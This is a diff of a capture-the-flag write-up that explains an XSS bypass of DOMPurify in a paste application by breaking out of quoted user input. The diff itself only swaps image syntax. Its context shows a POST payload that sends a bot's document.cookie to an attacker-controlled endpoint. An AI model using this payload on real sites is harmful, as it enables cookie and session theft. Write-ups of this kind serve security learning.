@@ -30,11 +30,12 @@ As an example, `["abc","bcd"]` would become `"abc","bcd"`.
 This means that when the page is rendered the *quotation marks* will close those used to save the user input in a *const*.  
 Now we can execute whatever code we want before **DOMPurify**'s *sanitize* function is called!  
 
-![Example using alert(1)]()  
+
+<img src="client_side.png" alt="Example using alert(1)">
 
 Now we just share the paste with *TJMike* to get their cookie and send it to an endpoint controlled by us and there's the flag!  
 
-![Flag]()  
+<img src="flag.png" alt="Flag">
 
 The payload I used in the *POST* request during the competition is the following:  
 `content=;eval(window.location.href='https://myendpoint.com?flag='.concat(document.cookie));//&content`  
